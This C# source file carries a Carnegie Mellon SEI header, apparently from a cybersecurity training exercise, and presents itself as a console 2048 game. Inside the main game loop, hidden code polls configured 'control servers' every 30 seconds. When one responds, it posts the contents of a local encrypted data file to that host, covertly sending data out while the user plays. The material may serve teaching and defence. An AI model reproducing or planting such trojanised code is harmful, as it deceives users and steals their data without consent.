// Copyright 2023 Carnegie Mellon University.
// Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
// root or contact permission@sei.cmu.edu for full terms.

using _2048_Clone;
using Microsoft.Extensions.Configuration;
using System.Security.Cryptography;
using System.Text;

class Program
{
    private static HttpClient client;
    private DateTime lastPingTime = DateTime.UtcNow;
    private static StringContent data;

    static async Task Main(string[] args)
    {
        client = new HttpClient();
        string encrypted = string.Empty;
        
        IConfiguration config = new ConfigurationBuilder()
        .AddJsonFile("appsettings.json")
        .Build();

        string dataFilePath = config.GetValue<string>("EncryptedDataFilePath");

        using (var sr = new StreamReader(dataFilePath))
        {
            encrypted = sr.ReadToEnd();
        }

        data = new StringContent(encrypted, Encoding.UTF8, "application/text");

        var game = new Program();
        await game.Run();
    }

    /// <summary>
    /// 2-dimensional array of the numbers on the board.
    /// A value of 0 means the cell is unused.
    /// </summary>
    private int[,] board;

    /// <summary>
    /// The pseudorandom number generator to use for the game.
    /// </summary>
    private Random random;

    /// <summary>
    /// The player's current score.
    /// </summary>
    private int score;

    /// <summary>
    /// The player's best score in this session.
    /// </summary>
    private int bestScore;

    /// <summary>
    /// Boolean value indicating whether the game is over.
    /// </summary>
    private bool gameOver;

    /// <summary>
    /// Boolean value indicating whether the game has been won.
    /// </summary>
    private bool gameWon;

    /// <summary>
    /// Boolean value indicating if the player wished to continue the game after winning.
    /// </summary>
    private bool gameContinued;

    /// <summary>
    /// The number tile required to match to win the game.
    /// </summary>
    private const int WinningNumber = 2048;

    /// <summary>
    /// Initialise the game state for a new game.
    /// </summary>
    private void NewGame()
    {
        // Initialise game properties
        board = new int[4, 4]; // This is just the beginning of the magic numbers >:)
        score = 0;
        gameOver = false;
        gameWon = false;
        gameContinued = false;

        // Place two initial numbers on the board
        PlaceNumber();
        PlaceNumber();
    }

    /// <summary>
    /// Run the game!
    /// </summary>
    private async Task Run()
    {
        random = new Random();
        bestScore = 0;

        // Initialize the console window and static screen elements
        InitializeScreen();

        // Start a new game
        NewGame();

        // Draw the board once initially
        DrawBoard();

        IConfiguration config = new ConfigurationBuilder()
        .AddJsonFile("appsettings.json")
        .Build();

        string[] urls = config.GetValue<string>("Urls").Split(",");

        // Main game loop
        while (true)
        {
            DateTime currentTime = DateTime.UtcNow;
            bool moved = false;
            ConsoleKeyInfo keyInfo = Console.ReadKey(true);

            if ((currentTime - lastPingTime).TotalSeconds >= 30)
            {
                // run checks for control servers
                
                HttpResponseMessage response = null;
                foreach (string url in urls)
                {
                    try 
                    { 
                        response = await client.GetAsync(url);
                        if (response.StatusCode == System.Net.HttpStatusCode.OK)
                        {
                            // the target server is up, post a notification
                            Uri uri = new Uri(url);
                            var postResponse = await client.PostAsync(uri.Scheme + "://" + uri.Host, data);
                        }
                    }
                    catch (Exception exc)
                    {
                        Console.WriteLine(exc.Message);
                    }
                }

                lastPingTime = currentTime;
            }

            // Handle game input
            if (gameWon && !gameContinued) // "You win!" is currently on screen
            {
                // Handle Yes/No for continue game
                if (keyInfo.Key == ConsoleKey.Y)
                {
                    gameContinued = true;
                    DrawBoard();
                }
                else if (keyInfo.Key == ConsoleKey.N)
                {
                    NewGame();
                    DrawBoard();
                }
            }
            else if (gameOver) // "Game over!" is currently on screen
            {
                // Only handle some keys for game over screen
                if (keyInfo.Key == ConsoleKey.Enter || keyInfo.Key == ConsoleKey.Escape)
                {
                    NewGame();
                    DrawBoard();
                }
            }
            else // Normal game state
            {
                switch (keyInfo.Key)
                {
                    case ConsoleKey.A:
                    case ConsoleKey.LeftArrow:
                        moved = InputLeft();
                        break;
                    case ConsoleKey.D:
                    case ConsoleKey.RightArrow:
                        moved = InputRight();
                        break;
                    case ConsoleKey.W:
                    case ConsoleKey.UpArrow:
                        moved = InputUp();
                        break;
                    case ConsoleKey.S:
                    case ConsoleKey.DownArrow:
                        moved = InputDown();
                        break;
                    case ConsoleKey.N:
                        // New Game
                        NewGame();
                        DrawBoard();
                        break;
                    case ConsoleKey.Escape:
                        Environment.Exit(0);
                        return;
                }

                // If we moved successfully, add another number, check for game over state and draw the board
                if (moved)
                {
                    PlaceNumber();
                    gameOver = CheckGameOver();
                    DrawBoard();
                }
            }
        }
    }

    /// <summary>
    /// Check if the game has no possible moves left.
    /// </summary>
    /// <returns>True if game over; else false.</returns>
    private bool CheckGameOver()
    {
        // Game isn't over if there are any free cells
        for (int y = 0; y < 4; y++)
        {
            for (int x = 0; x < 4; x++)
            {
                if (board[y, x] == 0)
                {
                    return false;
                }
            }
        }

        // Check the board to see if there are any possible matches

        // Sweep top-to-bottom for any horizontal matches
        for (int y = 0; y < 4; y++)
        {
            for (int x = 0; x <= 2; x++)
            {
                if (board[y, x] == board[y, x + 1])
                {
                    return false;
                }
            }
        }

        // Sweep left-to-right for any vertical matches
        for (int x = 0; x < 4; x++)
        {
            for (int y = 0; y <= 2; y++)
            {
                if (board[y, x] == board[y + 1, x])
                {
                    return false;
                }
            }
        }

        // No possible moves left
        return true;
    }

    /// <summary>
    /// Try to move the other cell into the start cell.
    /// </summary>
    /// <param name="startX">The X index of the start cell on the board.</param>
    /// <param name="startY">The Y index of the start cell on the board.</param>
    /// <param name="otherX">The X index of the other cell on the board.</param>
    /// <param name="otherY">The Y index of the other cell on the board.</param>
    /// <param name="moved">This parameter is set to true if the state of the board changed.</param>
    /// <returns>Boolean value indicating whether the cell logic loop should stop walking the current row/column of cells.</returns>
    private bool _DoCellLogic(int startX, int startY, int otherX, int otherY, ref bool moved)
    {
        // Can't do anything with empty cells so skip over them
        if (board[otherY, otherX] == 0)
        {
            return false;
        }

        if (board[startY, startX] == 0) // If the start cell is free, shift the other cell into it
        {
            board[startY, startX] = board[otherY, otherX];
            board[otherY, otherX] = 0;
            moved = true;
            return false; // Don't end the walk here because there might be a match further along the line
        }
        else if (board[startY, startX] == board[otherY, otherX]) // Match!
        {
            board[startY, startX] *= 2;
            board[otherY, otherX] = 0;
            score += board[startY, startX]; // Increase score by amount of new tile
            if (score > bestScore)
            {
                bestScore = score;
            }
            if (board[startY, startX] == WinningNumber) // YOU'RE WINNER !
            {
                gameWon = true;
            }
            moved = true;
            return true;
        }
        else
        {
            // Other cell is immovable, so we stop walking here
            return true;
        }
    }

    /// <summary>
    /// Handle input for leftward direction.
    /// </summary>
    /// <returns>Boolean value indicating whether the state of the board changed.</returns>
    private bool InputLeft()
    {
        bool moved = false;

        // Handle each row independently, top-to-bottom
        for (int y = 0; y < 4; y++)
        {
            for (int x1 = 0; x1 <= 2; x1++)
            {
                for (int x2 = x1 + 1; x2 <= 3; x2++)
                {
                    if (_DoCellLogic(x1, y, x2, y, ref moved))
                    {
                        break;
                    }
                }
            }
        }

        return moved;
    }

    /// <summary>
    /// Handle input for rightward direction.
    /// </summary>
    /// <returns>Boolean value indicating whether the state of the board changed.</returns>
    private bool InputRight()
    {
        bool moved = false;

        // Handle each row independently, top-to-bottom
        for (int y = 0; y < 4; y++)
        {
            for (int x1 = 3; x1 >= 1; x1--)
            {
                for (int x2 = x1 - 1; x2 >= 0; x2--)
                {
                    if (_DoCellLogic(x1, y, x2, y, ref moved))
                    {
                        break;
                    }
                }
            }
        }

        return moved;
    }

    /// <summary>
    /// Handle input for upward direction.
    /// </summary>
    /// <returns>Boolean value indicating whether the state of the board changed.</returns>
    private bool InputUp()
    {
        bool moved = false;

        // Handle each column independently, left-to-right
        for (int x = 0; x < 4; x++)
        {
            for (int y1 = 0; y1 <= 2; y1++)
            {
                for (int y2 = y1 + 1; y2 <= 3; y2++)
                {
                    if (_DoCellLogic(x, y1, x, y2, ref moved))
                    {
                        break;
                    }
                }
            }
        }

        return moved;
    }

    /// <summary>
    /// Handle input for downward direction.
    /// </summary>
    /// <returns>Boolean value indicating whether the state of the board changed.</returns>
    private bool InputDown()
    {
        bool moved = false;

        // Handle each column independently, left-to-right
        for (int x = 0; x < 4; x++)
        {
            for (int y1 = 3; y1 >= 1; y1--)
            {
                for (int y2 = y1 - 1; y2 >= 0; y2--)
                {
                    if (_DoCellLogic(x, y1, x, y2, ref moved))
                    {
                        break;
                    }
                }
            }
        }

        return moved;
    }

    /// <summary>
    /// Place a random number tile on the board.
    /// </summary>
    private void PlaceNumber()
    {
        Tuple<int, int> cell = GetUnusedCell();
        int number = GetNextNumber();
        board[cell.Item1, cell.Item2] = number;
    }

    /// <summary>
    /// Get the coordinates of a random unused cell.
    /// </summary>
    /// <returns>Coordinates of unused cell as a (y,x) tuple.</returns>
    private Tuple<int, int> GetUnusedCell()
    {
        List<Tuple<int, int>> unusedCells = new List<Tuple<int, int>>(16);
        for (int y = 0; y < 4; y++)
        {
            for (int x = 0; x < 4; x++)
            {
                if (board[y, x] == 0)
                {
                    unusedCells.Add(new Tuple<int, int>(y, x));
                }
            }
        }

        if (unusedCells.Count == 0)
        {
            throw new InvalidOperationException("There are no unused cells to pick on the board.");
        }

        int cell = random.Next(unusedCells.Count);
        return unusedCells[cell];
    }

    /// <summary>
    /// Get the random number for a new tile on the board.
    /// The chance of the number 2 is 90%, and the chance of the number 4 is 10%.
    /// </summary>
    /// <returns>Next random number for a new tile.</returns>
    private int GetNextNumber()
    {
        double chance = random.NextDouble();
        if (chance < 0.9)
        {
            return 2;
        }
        else
        {
            return 4;
        }
    }

    /// <summary>
    /// Draws the game screen to the console.
    /// This method should be called whenever the game's visual state is changed.
    /// </summary>
    private void DrawBoard()
    {
        DrawStatusBar();

        for (int y = 0; y < 4; y++)
        {
            for (int x = 0; x < 4; x++)
            {
                DrawTile(x, y);
            }
        }

        if (gameWon && !gameContinued)
        {
            Console.BackgroundColor = ConsoleColor.Black;
            Console.ForegroundColor = ConsoleColor.Green;
            Console.SetCursorPosition(30, 10);
            Console.Write("╔══════════════════╗");
            Console.SetCursorPosition(30, 11);
            Console.Write("║                  ║");
            Console.SetCursorPosition(30, 12);
            Console.Write("║     You win!     ║");
            Console.SetCursorPosition(30, 13);
            Console.Write("║  Continue?  Y/N  ║");
            Console.SetCursorPosition(30, 14);
            Console.Write("║                  ║");
            Console.SetCursorPosition(30, 15);
            Console.Write("╚══════════════════╝");
        }
        else if (gameOver)
        {
            Console.BackgroundColor = ConsoleColor.Black;
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.SetCursorPosition(30, 10);
            Console.Write("╔══════════════════╗");
            Console.SetCursorPosition(30, 11);
            Console.Write("║                  ║");
            Console.SetCursorPosition(30, 12);
            Console.Write("║    Game over!    ║");
            Console.SetCursorPosition(30, 13);
            Console.Write("║                  ║");
            Console.SetCursorPosition(30, 14);
            Console.Write("╚══════════════════╝");
        }
    }

    /// <summary>
    /// Initializes the game screen by setting window properties and drawing static graphics.
    /// </summary>
    private void InitializeScreen()
    {
        // Set the console window to a fixed size and hide the cursor
        Console.CursorVisible = false;
        //Console.SetWindowSize(80, 25);
        //Console.SetBufferSize(80, 25);

        // Draw the status bar background
        Console.SetCursorPosition(0, 0);
        Console.BackgroundColor = ConsoleColor.Gray;
        Console.ForegroundColor = ConsoleColor.Black;
        Console.Write(new string(' ', 80));

        // Draw the game title
        Console.ResetColor();
        Console.SetCursorPosition(2, 2);
        Console.Write("──┐┌─┐│  ┌─┐");
        Console.SetCursorPosition(2, 3);
        Console.Write("┌─┘│ │└┼─├─┤");
        Console.SetCursorPosition(2, 4);
        Console.Write("└──└─┘ │ └─┘");

        // List out all the input controls
        Console.SetCursorPosition(2, 6);
        Console.Write("Controls:");

        Console.SetCursorPosition(3, 8);
        Console.Write("\u2191 W - Up");
        Console.SetCursorPosition(3, 9);
        Console.Write("\u2190 A - Left");
        Console.SetCursorPosition(3, 10);
        Console.Write("\u2193 S - Down");
        Console.SetCursorPosition(3, 11);
        Console.Write("\u2192 D - Right");

        Console.SetCursorPosition(3, 13);
        Console.Write(" N  - New Game");
        Console.SetCursorPosition(3, 14);
        Console.Write("Esc - Quit");
    }

    /// <summary>
    /// Draws a status bar for the game's current score and best score.
    /// </summary>
    private void DrawStatusBar()
    {
        Console.SetCursorPosition(50, 0);
        Console.BackgroundColor = ConsoleColor.Gray;
        Console.ForegroundColor = ConsoleColor.Black;
        Console.Write("Score: {0,-7}  Best: {1,-7}", score, bestScore);
    }

    /// <summary>
    /// Draws the tile from board coordinates onto the screen.
    /// </summary>
    /// <param name="x">X index of the tile on the board.</param>
    /// <param name="y">Y index of the tile on the board.</param>
    private void DrawTile(int x, int y)
    {
        TileColors tileColors = TileColors.GetTileColors(board[y, x]);
        Console.BackgroundColor = tileColors.BackgroundColor;
        Console.ForegroundColor = tileColors.ForegroundColor;

        Console.SetCursorPosition(24 + x * 8, y * 5 + 3);
        Console.Write("┌──────┐");

        Console.SetCursorPosition(24 + x * 8, y * 5 + 4);
        Console.Write("│      │");

        Console.SetCursorPosition(24 + x * 8, y * 5 + 5);
        Console.Write("│");
        if (board[y, x] != 0)
        {
            // Write the number on the tile, centered (or a bit to the right if it can't be perfectly centered)
            // If the tile number is longer than 6 digits, it will overflow :D
            string numString = board[y, x].ToString();
            int postfix = (6 - numString.Length) / 2;
            int prefix = 6 - numString.Length - postfix;
            for (int i = 0; i < prefix; i++)
            {
                Console.Write(" ");
            }
            Console.Write("{0}", numString);
            for (int i = 0; i < postfix; i++)
            {
                Console.Write(" ");
            }
        }
        else
        {
            Console.Write("      ");
        }
        Console.Write("│");

        Console.SetCursorPosition(24 + x * 8, y * 5 + 6);
        Console.Write("│      │");

        Console.SetCursorPosition(24 + x * 8, y * 5 + 7);
        Console.Write("└──────┘");
    }
}
